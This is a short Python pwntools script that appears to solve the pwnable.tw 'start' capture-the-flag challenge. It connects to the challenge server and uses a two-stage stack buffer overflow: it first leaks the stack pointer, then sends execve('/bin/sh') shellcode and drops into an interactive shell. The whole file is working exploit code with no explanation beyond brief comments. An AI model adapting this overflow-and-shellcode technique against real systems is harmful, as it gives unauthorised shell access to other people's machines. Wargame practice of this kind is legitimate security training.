from pwn import *

shellcode = """
mov eax, 0x0b
push %s
push %s
mov ebx, esp
xor ecx, ecx
xor edx, edx
int 0x80
""" % (u32("/sh\0"), u32("/bin"))

DEBUG_MODE = False

def setgdb(filename : str):
    p = process(filename)
    context.terminal = ["tmux", "splitw", "-h"]
    context.log_level = 'debug'
    gdb.attach(p)
    return p

if __name__ == '__main__':
    if (DEBUG_MODE):
        p = setgdb('./start')
    else:
        p = remote("chall.pwnable.tw", 10000)
    p.recvuntil(':')
    # first BOF, get ESP address
    payload = b'A' * 0x14 + p32(0x08048087)
    p.send(payload)
    esp_addr = u32(p.recv()[:4]) + 0x14 # 0x14 for add esp
    # second BOF, call execve system call
    payload = b'A' * 0x14 + p32(esp_addr) + asm(shellcode)
    p.send(payload) # get shell
    p.interactive()
